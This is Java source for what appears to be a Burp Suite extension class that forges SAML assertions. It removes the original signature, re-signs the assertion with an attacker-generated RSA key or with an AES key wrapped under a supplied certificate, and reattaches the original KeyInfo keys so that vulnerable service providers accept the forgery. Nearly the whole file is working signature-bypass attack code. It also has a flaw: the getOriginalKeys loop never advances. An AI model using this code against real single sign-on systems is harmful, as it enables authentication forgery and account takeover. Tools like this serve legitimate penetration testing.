package application;

import helpers.XMLHelper;
import org.apache.xml.security.encryption.EncryptedKey;
import org.apache.xml.security.encryption.XMLCipher;
import org.apache.xml.security.keys.KeyInfo;
import org.apache.xml.security.keys.content.X509Data;
import org.apache.xml.security.keys.content.x509.XMLX509Certificate;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import ui.SAMLEditorPane;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpression;
import javax.xml.xpath.XPathFactory;
import java.security.Key;
import java.security.KeyPair;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;

import static burp.BurpExtender.stderr;
import static burp.BurpExtender.stdout;

public class KeyInjector {

    private SAMLEditorPane panel;

    public KeyInjector(SAMLEditorPane panel) {
       this.panel = panel;
    }

    public void printToConsole(String text) {
        if (panel != null) {
            panel.printToConsole(text);
        } else {
            stdout.println(text);
        }
    }

    public Node getKeyInfo(Document document) throws Exception {
        XPath xpath = XPathFactory.newInstance().newXPath();
        XPathExpression expr = xpath.compile("//*[local-name()='Assertion']/*[local-name()='Signature']/*[local-name()='KeyInfo']");
        NodeList keyInfoElements = (NodeList) expr.evaluate(document, XPathConstants.NODESET);
        stdout.println(keyInfoElements.getLength());
        return keyInfoElements.item(0);
    }

    public List<Node> getOriginalKeys(Document document) throws Exception {
        List<Node> origKeyInfoNodes = new ArrayList<Node>();
        Node firstKeyInfoElement = getKeyInfo(document).getFirstChild();
        if (firstKeyInfoElement.getNodeType() == Node.ELEMENT_NODE) {
            origKeyInfoNodes.add(firstKeyInfoElement);
        }
        while (firstKeyInfoElement.getNextSibling() != null) {
            Node additionalKeyInfoElement = firstKeyInfoElement.getNextSibling();
            if (additionalKeyInfoElement.getNodeType() == Node.ELEMENT_NODE) {
                origKeyInfoNodes.add(additionalKeyInfoElement);
            }
        }
        return origKeyInfoNodes;
    }

    public String injectRSAKey(String msg) throws Exception {
        Document document = XMLHelper.getDocument(msg);
        printToConsole("[+] Saving original KeyInfo block");
        List<Node> origKeyInfoNodes = getOriginalKeys(document);

        printToConsole("[+] Removing Signature");
        if (XMLHelper.removeAllSignatures(document) < 0) {
            throw new Exception("Can find signature");
        }

        printToConsole("[+] Injecting RSA Key");
        KeyPair rsaKyePair = XMLHelper.createKeyPair();
        PrivateKey private_key = rsaKyePair.getPrivate();
        PublicKey public_key = rsaKyePair.getPublic();

        printToConsole("[+] Signing message with RSA Key");
        XMLHelper.signAssertion(document, public_key, private_key);

        printToConsole("[+] Appending original Keys");
        Node newKeyInfo = getKeyInfo(document);
        for (int i = 0, n = origKeyInfoNodes.size(); i < n; ++i) {
            Node node = origKeyInfoNodes.get(i);
            XMLHelper.addNSPrefix(node, "ds");
            newKeyInfo.appendChild(node);
        }
        XMLHelper.trimWhitespace(document);
        String new_assertion = XMLHelper.getStringOfDocument(document, 0, false);
        new_assertion = new_assertion.replace("&#xd;", "");
        new_assertion = new_assertion.replace("&#13;", "");
        new_assertion = new_assertion.replace("\n", "");

        stdout.println(new_assertion);
        if (XMLHelper.validateRSASignature(XMLHelper.getDocument(new_assertion))) {
            return new_assertion;
        } else {
            printToConsole("[-] Invalid RSA Signature");
            return null;
        }
    }

    public String injectEncryptedKey(String msg, String cert_pem) throws Exception {
        Document document = XMLHelper.getDocument(msg);

        printToConsole("[+] Saving original KeyInfo block");
        List<Node> origKeyInfoNodes = new ArrayList<Node>();
        XPath xpath = XPathFactory.newInstance().newXPath();
        XPathExpression expr = xpath.compile("//*[local-name()='Assertion']/*[local-name()='Signature']/*[local-name()='KeyInfo']");
        NodeList keyInfoElements = (NodeList) expr.evaluate(document, XPathConstants.NODESET);
        Node keyInfoNode = keyInfoElements.item(0).getFirstChild();
        //Node keyInfoNode = document.getElementsByTagNameNS("*", "KeyInfo").item(0).getFirstChild();
        if (keyInfoNode.getNodeType() == Node.ELEMENT_NODE) {
            origKeyInfoNodes.add(keyInfoNode);
        }
        while (keyInfoNode.getNextSibling() != null) {
            keyInfoNode = keyInfoNode.getNextSibling();
            if (keyInfoNode.getNodeType() == Node.ELEMENT_NODE) {
                origKeyInfoNodes.add(keyInfoNode);
            }
        }

        printToConsole("[+] Removing Signature");
        if (XMLHelper.removeAllSignatures(document) < 0) {
            printToConsole("[-] Can't find signature");
            return null;
        }

        printToConsole("[+] Generating random symmetric key");
        Key symmetricKey = GenerateSymmetricKey();

        printToConsole("[+] Signing Assertion with symmetric key");
        XMLHelper.signAssertion(document, null, symmetricKey);

        printToConsole("[+] Encrypting symmetric key with provided certificate");
        X509Certificate cert = XMLHelper.convertToX509Cert(cert_pem);
        PublicKey keyEncryptKey = cert.getPublicKey();

        XMLCipher keyCipher = XMLCipher.getInstance(XMLCipher.RSA_v1dot5);
        keyCipher.init(XMLCipher.WRAP_MODE, keyEncryptKey);
        EncryptedKey encryptedKey = keyCipher.encryptKey(document, symmetricKey);

        X509Data x509data = new X509Data(document);
        x509data.add(new XMLX509Certificate(document, cert));
        KeyInfo ki = new KeyInfo(document);
        ki.add(x509data);
        encryptedKey.setKeyInfo(ki);
        Element e = keyCipher.martial(encryptedKey);

        printToConsole("[+] Appending original key");
        try {
            //Node newKeyInfo = document.getElementsByTagNameNS("*", "KeyInfo").item(0);
            Node newKeyInfo = keyInfoElements.item(0);

            // Remove KeyName added during signing because we had to provide something
            newKeyInfo.removeChild(newKeyInfo.getFirstChild());
            // Append our EncryptedKey element
            newKeyInfo.appendChild(e);
            // Append pre-existing Keys
            for (int i = 0, n = origKeyInfoNodes.size(); i < n; ++i) {
                Node node = origKeyInfoNodes.get(i);
                XMLHelper.addNSPrefix(node, "ds");
                newKeyInfo.appendChild(node);
            }
        } catch (Exception ex) {
            printToConsole("[-] Exception appending original key");
            ex.printStackTrace(stderr);
            throw ex;
        }

        XMLHelper.trimWhitespace(document);
        String new_assertion = XMLHelper.getStringOfDocument(document, 0, false);
        new_assertion = new_assertion.replace("&#xd;", "");
        new_assertion = new_assertion.replace("&#13;", "");
        new_assertion = new_assertion.replace("\n", "");

        return new_assertion;
    }

    public static SecretKey GenerateSymmetricKey() throws Exception {
        String jceAlgorithmName = "AES";
        KeyGenerator keyGenerator = KeyGenerator.getInstance(jceAlgorithmName);
        keyGenerator.init(128);
        SecretKey keyEncryptKey = keyGenerator.generateKey();
        return keyEncryptKey;
    }
}
